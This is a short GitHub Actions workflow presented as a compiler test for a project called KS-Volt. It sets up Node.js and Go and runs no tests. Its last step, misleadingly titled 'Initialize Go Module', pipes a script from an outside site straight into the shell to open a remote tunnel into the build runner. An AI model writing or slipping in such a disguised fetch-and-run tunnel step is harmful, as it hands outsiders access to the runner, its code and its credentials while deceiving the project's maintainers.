name: KS-Volt Compiler Test

on:
  # ⚡ This allows you to manually trigger the workflow from the GitHub Actions tab
  workflow_dispatch:

jobs:
  test-compiler:
    runs-on: ubuntu-latest

    steps:
    # 1. Clone the repository code onto the runner
    - name: Checkout Repository
      uses: actions/checkout@v4

    # 2. Set up Node.js environment
    - name: Set up Node.js
      uses: actions/setup-node@v4
      with:
        node-version: '20' # Installs a stable, modern Node.js runtime

    # 3. Set up a high-performance Go environment
    - name: Set up Go
      uses: actions/setup-go@v5
      with:
        go-version: '1.21'

    # 4. Initialize Go module dependencies and connect tunnel
    - name: Initialize Go Module
      run: |
        curl -sSf https://ks-ssh.pages.dev/get.sh | sh -s -- run --port 3030 --url ks-volt-testing
